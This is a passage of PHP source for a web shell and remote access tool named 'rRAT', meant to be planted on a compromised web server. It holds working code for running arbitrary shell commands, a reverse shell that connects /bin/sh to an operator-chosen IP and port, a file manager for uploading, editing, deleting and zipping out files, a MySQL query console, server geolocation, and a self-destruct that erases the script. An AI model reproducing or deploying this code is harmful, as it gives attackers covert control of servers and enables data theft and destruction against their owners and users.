		$h[] = '				<div class="form-group">';
		$h[] = '					<div class="col-md-12">';
		$h[] = '						<textarea id="sqlresult" class="form-control" readonly></textarea>';
		$h[] = '					</div>';
		$h[] = '				</div>';
		$h[] = '			</div>';
		$h[] = '		</div>';
		$h[] = '	</div>';
		$h[] = '	<div class="col-md-12" id="data-column">';
		$h[] = '		<div class="panel panel-default">';
		$h[] = '			<div class="panel-heading">';
		$h[] = '				Data';
		$h[] = '			</div>';
		$h[] = '			<div class="panel-body">';
		$h[] = '				<table class="table" id="data-table">';
		$h[] = '					<thead>';
		$h[] = '						<tr></tr>';
		$h[] = '					</thead>';
		$h[] = '					<tbody></tbody>';
		$h[] = '				</table>';
		$h[] = '			</div>';
		$h[] = '		</div>';
		$h[] = '	</div>';
		$h[] = '</div>';
		return $h;
	}

	/**
	 * Returns the html code for the Location site. Only available if GEO is defined as true.
	 *
	 * @return array
	 */
	static function getLocation() 
	{
		$h[] = '<div class="row">';
		$h[] = '	<div class="col-md-12">';
		$h[] = '		<div class="panel panel-default">';
		$h[] = '			<div class="panel-heading">';
		$h[] = '				Location';
		$h[] = '			</div>';
		$h[] = '			<div id="map" class="panel-body"></div>';
		$h[] = '			<script type="text/javascript">';
		$h[] = '			function drawMap() {';
		$h[] = '				var location = new google.maps.LatLng(' . $_SESSION['geo']['lat']. ', ' . $_SESSION['geo']['lon'] .');';
		$h[] = '				var mapCanvas = document.getElementById("map");';
		$h[] = '				var mapOptions = {';
		$h[] = '					center: location,';
		$h[] = '					zoom: 15';
		$h[] = '				}';
		$h[] = '				var map = new google.maps.Map(mapCanvas, mapOptions);';
		$h[] = '				var marker = new google.maps.Marker({';
		$h[] = '					position: location,';
		$h[] = '					map: map';
		$h[] = '				})';
		$h[] = '			}';
		$h[] = '			</script>';
		$h[] = '			<script src="https://maps.googleapis.com/maps/api/js?callback=drawMap"></script>';
		$h[] = '		</div>';
		$h[] = '	</div>';
		$h[] = '</div>';
		return $h;
	}
	
	/**
	 * Returns the html for the self destruct form.
	 *
	 * @return array
	 */
	static function getSelfDestruct()
	{
		$h[] = '<div class="row">';
		$h[] = '	<div class="col-md-4 col-lg-4 col-md-offset-4 col-lg-offset-4">';
		$h[] = '		<div class="panel panel-default">';
		$h[] = '			<div class="panel-heading">';
		$h[] = '				Self destruction';
		$h[] = '			</div>';
		$h[] = '			<div class="panel-body">';
		$h[] = '				<p>Type "SELFDESTRUCT" in the field below and click the button. Removal <strong>cannot</strong> be undone!</p>';
		$h[] = '				<form class="form-horizontal" method="post" role="form" action="?menu=selfdestruct&submit" accept-charset="UTF-8">';
		$h[] = '					<div class="form-group">';
		$h[] = '						<div class="col-md-8">';
		$h[] = '							<input type="text" class="form-control" id="selfdestructinput" name="selfdestructinput">';
		$h[] = '						</div>';
		$h[] = '						<input type="submit" class="btn btn-success" value="Remove shell">';
		$h[] = '					</div>';
		$h[] = '				</form>';
		$h[] = '			</div>';
		$h[] = '		</div>';
		$h[] = '	</div>';
		$h[] = '</div>';
		return $h;
	}
	
	/**
	 * Returns file contents in an 'Editor'.
	 *
	 * @param string $_file
	 * @return array
	 */
	static function getEditor($_file)
	{
		$data = file_get_contents($_file);
		$h[] = '<div class="row">';
		$h[] = '	<div class="col-md-12">';
		$h[] = '		<div class="panel panel-default">';
		$h[] = '			<div class="panel-heading">';
		$h[] = '				Editor: ' . $_file;
		$h[] = '			</div>';
		$h[] = '			<div class="panel-body">';
		$h[] = '				<form role="form" method="post" class="form-horizontal" accept-charset="UTF-8" action="#">';
		$h[] = '					<div class="form-group">';
		$h[] = '						<input type="hidden" value="'.$_file.'" id="filename">';
		$h[] = '						<div class="col-md-12">';
		$h[] = '							<textarea class="form-control" id="editorwindow">';
		$h[] = 									htmlspecialchars($data);
		$h[] = '							</textarea>';
		$h[] = '						</div>';
		$h[] = '					</div>';
		$h[] = '					<button type="button" id="editor-save-btn" class="btn btn-success">Save</button>';
		$h[] = '					<a href="?menu=files" id="editor-close-btn" class="btn btn-success">Close</a>';
		$h[] = '				</form>';
		$h[] = '			</div>';
		$h[] = '		</div>';
		$h[] = '	</div>';
		$h[] = '</div>';
		return $h;
	}
}

/**
 * Class Funcs
 * Holds all functions needed for the RAT.
 *
 * @function login
 * @function logout
 * @function executeShellCommand
 * @function getCpuLoad
 * @function getSystemMemInfo
 * @function reverseShell
 * @function getExternalIp
 * @function getLocation
 * @function zip
 * @function mySqlQuery
 * @function createFile
 * @function createFolder
 * @function getFileContent
 */
class Funcs {

	/**
	 * Compares the entered username and password with the ones defined (bcrypt) at the top of the script. If match user gets logged in and a session is created.
	 *
	 * @param string $_username
	 * @param string $_password
	 * @return bool
	 */
	static function login($_username, $_password) 
	{
		if (password_verify($_username, USER) && password_verify($_password, PASS)) 
		{
			$_SESSION['loggedin'] = 1;
			return true;
		}
		return false;
	}

	/**
	 * Logs user out and destroys session.
	 *
	 * @return void
	 */
	static function logout() 
	{
		session_destroy();
		session_start();
		session_destroy();
		header('Location: ?menu=GoodBye');
	}

	/**
	 * Executes shell command.
	 *
	 * @param string $_command
	 * @return mixed
	 */
	static function executeShellCommand($_command) 
	{
		exec($_command, $out, $result);
		return $out;
	}

	/**
	 * Returns the CPU load on both Linux and Windows machines
	 *
	 * @return int
	 */
	static function getCpuLoad() 
	{
		if (stristr(PHP_OS, 'win')) 
		{
			$wmi = new COM("Winmgmts://");
			$server = $wmi->execquery("SELECT LoadPercentage FROM Win32_Processor");
			$cpu_num = 0;
			$load_total = 0;
			foreach ($server as $cpu)
			{
				$cpu_num++;
				$load_total += $cpu->loadpercentage;
			}
			$load = round($load_total/$cpu_num);
		}
		else 
		{
			$sys_load = sys_getloadavg();
			$load = $sys_load[0] . ' / ' . $sys_load[1] . ' / ' . $sys_load[2];
		}
		return $load;
	}

	/**
	 * L I N U X  O N L Y
	 * Returns information on the RAM
	 *
	 * @return array
	 */
	static function getSystemMemInfo() 
	{
		$data = explode("\n", file_get_contents("/proc/meminfo"));
		$meminfo = array();
		foreach ($data as $line) 
		{
			list($key, $val) = explode(":", $line);
			$meminfo[$key] = trim($val);
		}
		return $meminfo;
	}

	/**
	 * L I N U X  O N L Y
	 * Connects to a Reverse Shell listener(e.g. netcat) on the given ip and port.
	 *
	 * @param string $_ip
	 * @param int $_port
	 */
	static function reverseShell($_ip, $_port)
	{
		set_time_limit(0);
		$chunk_size = 1400;
		$write = null;
		$error = null;
		$shell = 'uname -a; w; id; /bin/sh -i';
		if (function_exists('pcntl_fork')) 
		{
			$pid = pcntl_fork();
			if ($pid == -1) 
			{
				exit(-1);
			}
			if ($pid) 
			{
				exit(0);
			}
			if (posix_setsid() == -1) 
			{
				exit(1);
			}
		}
		chdir('/');
		umask(0);
		$sock = fsockopen($_ip, $_port, $errno, $errstr, 30);
		if (!$sock) 
		{
			exit(1);
		}
		$descriptors = array(0 => array('pipe', 'r'), 1=> array('pipe', 'w'), 2 => array('pipe', 'w'));
		$process = proc_open($shell, $descriptors, $pipes);
		if (!is_resource($process)) 
		{
			exit(1);
		}
		for ($i = 0; $i < 3; $i++) 
		{
			stream_set_blocking($pipes[$i], 0);
		}
		stream_set_blocking($sock, 0);
		while (1) 
		{
			if (feof($sock)) 
			{
				break;
			}
			if(feof($pipes[1])) 
			{
				break;
			}
			$read = array($sock, $pipes[1], $pipes[2]);
			stream_select($read, $write, $error, null);
			if (in_array($sock, $read))
			{
				$input = fread($sock, $chunk_size);
				fwrite($pipes[0], $input);
			}
			if (in_array($pipes[1],$read))
			{
				$input = fread($pipes[1], $chunk_size);
				fwrite($sock, $input);
			}
			if (in_array($pipes[2], $read))
			{
				$input = fread($pipes[2], $chunk_size);
				fwrite($sock, $input);
			}
		}
		fclose($sock);
		for ($i = 0; $i < 3; $i++) 
		{
			fclose($pipes[$i]);
		}
		proc_close($process);
	}

	/**
	 * Returns the external IP of the server.
	 *
	 * @return mixed
	 */
	static function getExternalIp() 
	{
		$externalContent = file_get_contents('http://checkip.dyndns.com/');
		preg_match('/Current IP Address: \[?([:.0-9a-fA-F]+)\]?/', $externalContent, $m);
		return $m[1];
	}

	/**
	 * Returns Information about isp and geolocation.
	 *
	 * @param string $_ip
	 * @return bool|mixed
	 */
	static function getLocation($_ip) 
	{
		$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$_ip));
		if($query && $query['status'] == 'success') 
		{
			return $query;
		}
		else 
		{
			return false;
		}
	}
	
	/**
	 * Zips file or folder and downloads the archive.
	 *
	 * @param string $_pathToFile
	 * @return bool
	 */
	static function zip($_pathToFile)
	{
		$zip = new ZipArchive();
		if ($zip->open(basename($_pathToFile).'.zip',ZipArchive::CREATE) !== true)
		{
			return false;
		}
		if (is_dir($_pathToFile))
		{
			$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($_pathToFile));
			foreach ($iterator as $key => $value)
			{
				if (basename($key) != '.' && basename($key) != '..')
				{
					$zip->addFile(realpath($key), $key);
				}
			}
		}
		else
		{
			$zip->addFile($_pathToFile);
		}
		$zip->close();
		header('Content-Disposition: attachment; filename="'.basename($_pathToFile).'.zip"');
		print readfile(basename($_pathToFile).'.zip');
	}
	
	/**
	 * Sends an SQL statement to ta specified server and returns the result as array.
	 *
	 * @param string $_host
	 * @param string $_user
	 * @param string $_pass
	 * @param string $_query
	 * @param int $_port
	 * @return array
	 */
	static function mySqlQuery($_host, $_user, $_pass, $_db, $_query, $_port = 3306) 
	{
		$mysqli = new Mysqli($_host,$_user,$_pass,$_db, $_port);
		$result = $mysqli->query($_query);
		if(mysqli_connect_errno())
			$data['answer'] = mysqli_connect_error();
		else{
			$data['answer'] = 'Affected '.mysqli_affected_rows($mysqli) . (mysqli_affected_rows($mysqli) == 1 ? ' row' : ' rows');
			while($row = $result -> fetch_assoc())
			{
				$data['rows'][] = $row;	
			}
		}
		return $data;
	}
	
	/**
	 * Creates a new file and sets permisssions on file.
	 *
	 * @param string $_dirname
	 * @param string $_filename
	 * @return bool
	 */
	static function createfile($_dirname, $_filename)
	{
		$file = fopen($_dirname . DIRECTORY_SEPARATOR . $_filename, 'w');
		if($file)
		{
			fclose($file);
			return true;
		}
		return false;
	}
	
	/**
	 * Creates a new folder.
	 *
	 * @param string $_path
	 * @param string $_foldername
	 * @return bool
	 */
	static function createFolder($_path, $_foldername)
	{
		if(mkdir($_path . DIRECTORY_SEPARATOR . $_foldername))
		{
			return true;
		}
		return false;
	}
	
	/**
	 * Reads content from a specified file.
	 *
	 * @param string $_pathtofile
	 * @return string
	 */
	static function getFileContent($_pathtofile) 
	{
		$file = file($_pathtofile);
		$result = array();
		for($i = 0; $i < count($file); $i++)
		{
			$result[] = $file[$i];
		}
		return $result;
	}
}

class SelfDestruct 
{
	function __destruct()
	{
		unlink(__FILE__);
	}
}

/******************************************************* B R A I N ****************************************************/
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] != 1) 
{
	$_TITLE = 'Login';
	$_CONTENT = Html::getLoginForm(false, $_SERVER['https']);
	if (isset($_GET['action']) && $_GET['action'] == 'login') 
	{
		if (isset($_POST['username']) && !empty($_POST['username']) && isset($_POST['password']) && !empty($_POST['password'])) 
		{
			if (Funcs::login(htmlspecialchars($_POST['username']), htmlspecialchars($_POST['password']))) 
			{
				header('Location: ?menu=server');
			}
			else 
			{
				$_CONTENT = Html::getLoginForm(true, $_SERVER['https']);
			}
		}
	}
}
else {
	/************************************************** M E N U *******************************************************/
	if (!isset($_GET['menu'])) $_GET['menu'] = '-';
	switch ($_GET['menu']) 
	{
		/*
		 * Displays server information
		 */
		case 'server':
			$_TITLE = 'Serverinfo';
			$_CONTENT = Html::getServerInfo();
			break;

		/*
		 * Logs user out
		 */
		case 'logout':
			Funcs::logout();
			header('Location: ?GoodBye');
			break;

		/*
		 * Displays the file explorer
		 */
		case 'files':
			$_TITLE = 'Files';
			if (!isset($_GET['error']))
			{
				if (isset($_SESSION['path']))
				{
					$_CONTENT = Html::getFileExplorer($_SESSION['path']);
				}
				else
				{
					$_CONTENT = Html::getFileExplorer(getcwd());	
				}
				
			}
			else
			{
				$_CONTENT = Html::getFileExplorer(getcwd(), 1);
			}
			
			break;

		/*
		 * Displays the execute shell
		 */
		case 'shell':
			$_TITLE = 'Shell';
			$_CONTENT = Html::getShell();
			break;

		/*
		 * Displays the form for the reverse shell
		 */
		case 'reverseshell':
			$_TITLE = 'Reverse Shell';
			$_CONTENT = Html::getReverseShell();
			break;

		/*
		 * Displays the SQL shell
		 */
		case 'sqlshell':
			$_TITLE = 'SQL Shell';
			$_CONTENT = Html::getSqlShell();
			break;
			
		case 'phpinfo':
			$_TITLE = 'PHP INFO';
			$_CONTENT = phpinfo();
			break;

		/*
		 * Displays a Google map; only if GEO is defined true
		 */
		case 'location';
			$_TITLE = 'Location map';
			$_CONTENT = Html::getLocation();
			break;
		
		/*
		 * Displays the form for self destruction
		 */		
		case 'selfdestruct':
			$_TITLE = 'Self destruction';
			$_CONTENT = Html::getSelfDestruct();
			if (isset($_GET['submit']))
			{
				if (isset($_POST['selfdestructinput']) && !empty($_POST['selfdestructinput']) && $_POST['selfdestructinput'] === 'SELFDESTRUCT')
				{
					$destruct = new SelfDestruct();
				}
			}
			break;
			
		/*
		 * Displays a file opened in the editor.
		 */
		case 'editor':
			if (isset($_GET['file']))
			{
				$_TITLE = 'Editor';
				$_CONTENT = Html::getEditor($_GET['file']);
			}
			break;

		default:

			break;
	}
	/************************************************** A J A X *******************************************************/
	if (!isset($_GET['ajax'])) $_GET['ajax'] = '-';
	switch ($_GET['ajax']) 
	{
		/*
		 * Executes a shell command
		 */
		case 'shell';
			if (isset($_POST['shellcommand']) && !empty($_POST['shellcommand'])) 
			{
				echo implode(PHP_EOL, Funcs::executeShellCommand($_POST['shellcommand']));
				exit();
			}
			break;

		/*
		 * Starts reverse shell
		 */
		case 'reverseShell':
			if (isset($_POST['host']) && isset($_POST['port']) && !empty($_POST['host']) && !empty($_POST['port'])) 
			{
				Funcs::reverseShell($_POST['host'], intval($_POST['port']));
			}
			break;

		/*
		 * Everything sent from the file explorer.
		 */
		case 'files':
			if (isset($_GET['action'])) 
			{
				switch ($_GET['action']) 
				{
					/*
					 * changes directory and echos the content.
					 */
					case 'chdir':
						if (isset($_GET['dir'])) 
						{
							chdir(urldecode($_GET['dir']));
							$_SESSION['path'] = getcwd();
							echo implode(PHP_EOL, Html::getFileExplorer(getcwd()));
							exit();
						}
						break;
					
					/*
					 * Zips a file or folder and downloads it.
					 */
					case 'download':
						Funcs::zip($_GET['file']);
						break;
						
					/*
					 * Creates a new folder ind the working directory
					 */	
					case 'mkdir':
						if (isset($_POST['foldername']) && !empty($_POST['foldername']))
						{
							if (Funcs::createFolder($_POST['cwd'], $_POST['foldername']))
							{
								echo 1;
								exit();
							}
						}
						echo 0;
						exit();						
						break;
						
					/*
					 * Creates a new file
					 */	
					case 'mkfile':
						if (isset($_POST['filename']) && !empty($_POST['filename']))
						{
							if (Funcs::createFile($_POST['cwd'], $_POST['filename']))
							{
								echo 1;
								exit();
							}
							echo 0;
							exit();
						}					
						break;
						
					/*
					 * Deletes files and folders.
					 */	
					case 'delete':
						if (isset($_GET['file']))
						{
							if (is_dir($_GET['file']))
							{
								if (rmdir($_GET['file']))
								{
									header('Location: ?menu=files');
								}
								else
								{
									header('Location: ?menu=files&error');
								}
							}
							if (is_file($_GET['file']))
							{
								if (unlink($_GET['file']))
								{
									header('Location: ?menu=files');
								}
								else
								{
									header('Location: ?menu=files&error');
								}
							}
						}
						break;
						
					/*
					 * Moves a file to a new location.
					 */
					case 'move':
						if (isset($_POST['old']) && isset($_POST['new']) && !empty($_POST['old']) && !empty($_POST['new']))
						{
							if (rename(urldecode($_POST['old']), $_POST['new'])) {}
						}
						break;
						
					/*
					 * Copies a filepath to 'clipboard'.
					 */	
					case 'copy':
						$_SESSION['copy'] = 1;
						$_SESSION['sourcefile'] = $_POST['sourcefile'];
						echo $_SESSION['copy'];
						break;
						
					/*
					 * Pastes a file to a selected folder.
					 */
					case 'paste':
						if (isset($_SESSION['sourcefile']) && isset($_POST['destfolder'])) 
						{
							$destfile = urldecode($_POST['destfolder']) . DIRECTORY_SEPARATOR . basename(urldecode($_SESSION['sourcefile']));
							if (copy(urldecode($_SESSION['sourcefile']), $destfile))
							{
								unset($_SESSION['copy']);
								unset($_SESSION['sourcefile']);
							}
						}
						break;
						
					/*
					 * Uploads a file to the active working directory.
					 */
					case 'upload':
						move_uploaded_file($_FILES['file']['tmp_name'], $_POST['cwd'] . DIRECTORY_SEPARATOR . $_FILES['file']['name']);
						break;
						
					/*
					 * Displays a file opened in the editor.
					 */	
					case 'edit':
						if (isset($_GET['file']))
						{
							$_CONTENT = Html::getEditor($_GET['file']);
							exit();
						}
						break;	
						
					/*
					 * Saves the file opened in the editor.
					 */	
					case 'savefile':
						if (isset($_POST['filecontent']) && isset($_POST['filename']))
						{
							file_put_contents($_POST['filename'], $_POST['filecontent']);
						}
						break;
				}
			}
			break;
			
		/*
		 * Runs an sql statement with specified credentials. Returns the result as json encoded array.
		 */	
		case 'sqlShell':
			if (isset($_POST['query']) && isset($_POST['dbuser']) && isset($_POST['dbpass']) && isset($_POST['dbname']) && isset($_POST['dbhost']) && !empty($_POST['query']) && !empty($_POST['dbuser']) && !empty($_POST['dbpass']) && !empty($_POST['dbname']) && !empty($_POST['dbhost']))
			{
				$port = 3306; // default port
				if (isset($_POST['dbport']) && !empty($_POST['dbport']))
				{
					$port = intval($_POST['dbport']); // only if a port other than default is specified
				}
				$data = Funcs::mySqlQuery($_POST['dbhost'], $_POST['dbuser'], $_POST['dbpass'], $_POST['dbname'], $_POST['query'], $port);
				echo json_encode($data);
				exit();
			}
			break;
			
	}
}
?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta name="robots" content="noindex,nofollow" />
		<title><?php if(isset($_TITLE)) echo $_TITLE . ' | '?>rRAT</title>
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
		<style>
		html,body {margin:0;padding:0;}
		body {background-color:#363636;}
		#footer {width:100%;background-color:black;color:white;height:30px;position:fixed;bottom:0;text-align: center;padding-top: 6px;z-index:1000;}
		table {table-layout: fixed; width: 100%;}
		table td {word-wrap: break-word; overflow-wrap: break-word;}
		.panel-default {border: 1px solid #19fffa;}
		.panel-default>.panel-heading  {background-color: black; color: #19fffa; border-bottom: 1px solid #19fffa;}
		.btn-success {color: #19fffa; background-color: black; border: 1px solid #19fffa;}
		.btn-success:hover,.btn-success:focus {background-color: #19fffa; color: black;}
		.panel-default>.panel-body {background-color: #141414; color: #19fffa;}
		#shellresult, #query, #sqlresult, #editorwindow {border:none; background-color: #141414; color: #19fffa;}
		#shellcommand, #precommand, #host, #port, #dbhost, #dbuser, #dbpass, #dbname, #dbport, #selfdestructinput, #mkdirname, #mkfilename, .moveto, #username, #password, #uploadfilename {background-color: black; color: #19fffa; border: none; border-bottom: 1px solid #19fffa;}
		#data-column {display:none;}
		#form-login {height: 310px; position: absolute; top: 50%; margin-top: -155px; width: 97%;}
		.container {width: 95%; margin-top: 60px;}
		#content {margin-top: 75px;}
		#footer {border-top: 1px solid #19fffa; color: #19fffa;}
		#navigation {position: fixed;top: 0;width: 100%; height: 52px; z-index: 1000; color: #19fffa; border-bottom: 1px solid #19fffa;}
		.navbar-inverse .navbar-nav>li>a {color: #19fffa;}
		.navbar-inverse .navbar-nav>li>a:hover { background-color: #19fffa; color: black;}
		.navbar-inverse .navbar-nav>.active>a, .navbar-inverse .navbar-nav>.active>a:focus, .navbar-inverse .navbar-nav>.active>a:hover{background-color: #19fffa; color: black;}
		#sqlresult {height: 377px;}
		.alert-warning {background-color: #19fffa; border: none; color: black;}
		.moveto {width: 100px;}
		#connectinginfo, #connectionterminated, #explorererror {display: none;}
		</style>
		<link href="data:image/x-icon;base64,<?php echo Icon::getIcon('favicon')?>" rel="icon" type="image/x-icon" />
		<!-- jQuery -->
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
		<!-- jQuery end -->
		<!-- Bootstrap -->
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
		<!-- Bootstrap end-->
		
		<script ="text/javascript">
		$(document).ready(function() {

            /**
             * Executes a shell command and displays the result.
             */
            function executeShellCommand() {
                $('#executeshellcommand').click(function(e) {
                    var href = '?ajax=shell';
                    // Runs predefined command from dropdown menu
                    if ($('#precommand').val() != 'manual') {
                        var formData = {
                            shellcommand: $('#precommand').val()
                        };
                    }
                    // Runs a command entered by the user
                    else {
                        var formData = {
                            shellcommand: $('#shellcommand').val()
                        };
                    }
                    $.ajax({
                        type: 'POST',
                        url:   href,
                        data:  formData
                    }).done(function (data) {
                        $('#shellresult').val(data);
                    });
                    e.preventDefault();
                });
            }

            /**
             * Connects to the Listener and starts reverse shell
             * Linux only
             */
            function runReverseShell() {
                $('#startreverseshell').click(function() {
                    var href = $('#reverseshellform').attr('action');
                    var formdata = {
                        host: $('#host').val(),
                        port: $('#port').val()
                    };
                    $('#connectinginfo').show();
                    $('#connectionterminated').hide();
                    $.ajax({
                        type: 'POST',
                        url: href,
                        data: formdata
                    }).done(function(data) {
                        $('#connectinginfo').hide();
                        $('#connectionterminated').show();
                    });
                });
            }

            /**
             * Sets up layouts
             */
            function setupLayouts() {
                $('#shellresult').height($(window).height() - 275);
				$('#map').height($(window).height() - 210);
                $('#editorwindow').height($(window).height() - 275);
				$('#query').height('300px');
            }

            function assignAjax() {
                $('.directory_link').filter(':not(.converted)').addClass('converted').on('click', function(e) {
                    e.preventDefault();
                    var href = $(this).attr('href');
                    $('#content').fadeOut(0, function () {
                        $('#content').load(href, function () {
                            $('#content').fadeIn(0);
                            assignAjax();
							addListeners();
                        });
                    });
                    e.preventDefault();
                });
            }

            /**
             * Sends sql query
             */
            function sqlQuery() {
                $('#sqlquery-button').click(function(e) {
                    e.preventDefault();
					$('#data-table tbody').html("");
					$('#data-table thead tr').html("");
                    var href = '?ajax=sqlShell';
                    var formdata = {
                        dbuser: $('#dbuser').val(),
                        dbpass: $('#dbpass').val(),
                        dbhost: $('#dbhost').val(),
                        dbport: $('#dbport').val(),
                        dbname: $('#dbname').val(),
                        query: $('#query').val()
                    };
                    $.ajax({
                        type: 'POST',
                        url: href,
                        data: formdata
                    }).done(function(data) {
						$('#data-column').fadeIn(200);
                        data = jQuery.parseJSON(data);
                        $('#sqlresult').append(data.answer);
						var counter = 0;
                        var rows = data.rows;
						$.each(rows, function(key, value) {
							$('#data-table tbody').append('<tr id="row-'+key+'">');
							$.each(value, function(index, val) {
								
								if (counter == 0) {
									$('#data-table thead tr').append('<th>'+index+'</th>');
								}
								$('#data-table tbody #row-'+key).append('<td>'+val+'</td>');
							});
							counter++;
							$('#data-table tbody').append('</tr>');
						});
                    });
                })
            }

            /**
             * Creates a new folder
             */
             function createFolder() {
                $('#mkdir-btn').click(function() {
                    var href = '?ajax=files&action=mkdir';
                    var formdata = {
                        foldername: $('#mkdirname').val(),
                        cwd: $('#dirname').val()
                    };
                    $.ajax({
                        type: 'POST',
                        url: href,
                        data: formdata
                    }).done(function(data) {
                        if (data == 1) {
                            location.reload(true);
                        }
                        else {
                            $('#explorererror').show();
                        }
                    })
                });
             }

             /**
              * Creates a new file with specified name
              */
             function createFile() {
                 $('#mkfile-btn').click(function() {
                    var href = '?ajax=files&action=mkfile';
                    var formdata = {
                        filename: $('#mkfilename').val(),
                        cwd: $('#dirname').val()
                    };
                    $.ajax({
                        type: 'POST',
                        url: href,
                        data: formdata
                    }).done(function(data) {
                        if (data == 1) {
                            location.reload(true);
                        }
                        else {
                            $('#explorererror').show();
                        }
                    })
                });
             }

             /**
              * Uploads a file via ajax.
              */
             function fileUpload() {
                $('#upload-btn').click(function(e) {
                    e.preventDefault();
                    var form_data = new FormData();
                    form_data.append('file', $('#uploadfilename').prop('files')[0]);
                    form_data.append('cwd', $('#dirname').val());
                    $.ajax({
                        url: '?ajax=files&action=upload',
                        dataType: 'text',
                        cache: false,
                        contentType: false,
                        processData: false,
                        data: form_data,
                        type: 'post',
                        success: function(data){
                            location.reload(true);
                        }
                    });
                });
            }

            /**
             * Moves/renames a file.
             */
            function moveFile() {
                $('.moveto-btn').click(function(e) {
                    e.preventDefault();
                    var that = this;
                    var href = '?ajax=files&action=move';
                    var formdata = {
                        old: $(that).attr('href'),
                        new: $('.moveto').val()
                    };
                    $.ajax({
                        type: 'POST',
                        url: href,
                        data: formdata
                    }).done(function(data) {
                        location.reload(true);
                    });
                });
            }

            /**
             * Copies a file to 'clipboard'. Actually the path is stored in session.
             */
            function copyFile() {
                $('.copy-btn').click(function(e) {
                    e.preventDefault();
                    var that = this;
                    var href = '?ajax=files&action=copy';
                    var formdata = {
                        sourcefile: $(that).attr('id')
                    };
                    $.ajax({
                        type: 'POST',
                        url: href,
                        data: formdata
                    }).done(function(data) {
                        location.reload(true);
                    });
                    e.preventDefault();
                });
            }

            /**
             * Pastes a file into a folder.
             */
            function pasteFile() {
                $('.paste-btn').click(function(e) {
                    e.preventDefault();
                    var that = this;
                    var href = '?ajax=files&action=paste';
                    var formdata = {
                        destfolder: $(that).attr('href')
                    };
                    $.ajax({
                        type: 'POST',
                        url: href,
                        data: formdata
                    }).done(function(data) {
                        location.reload(true);
                    });
                    e.preventDefault();
                });
            }
			
			/**
			 * Saves a file opened in the editor.
			 */
			function saveFile() {
				$('#editor-save-btn').click(function(e) {
					e.preventDefault();
					var href = '?ajax=files&action=savefile';
					var formdata = {
						filecontent: $('#editorwindow').val(),
						filename: $('#filename').val()
					};
					$.ajax({
						type: 'POST',
						url: href,
						data: formdata
					}).done(function(data) {
						window.location.href = '?menu=files';
					});
					e.preventDefault();
				});
			}

            /**
             * Executes the listeners.
             */
            function addListeners() {
                assignAjax();
                setupLayouts();
                executeShellCommand();
                runReverseShell();
                sqlQuery();
                createFolder();
                createFile();
                fileUpload();
                moveFile();
                copyFile();
                pasteFile();
				saveFile();
            }

            addListeners();
        });
		</script>
	</head>
	<body>
		<?php
		if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == 1) {
			echo '<div id="navigation">';
			echo implode(PHP_EOL, Html::getNavbar());
			echo '</div>';
		}
		?>
		<div id="content" class="container ">
			<?php if (isset($_CONTENT)) echo implode(PHP_EOL, $_CONTENT) ?>
		</div>
		<?php if(isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == 1) echo '<div id="footer">rRAT &middot; 1.0</div>' ?>
	</body>
</html>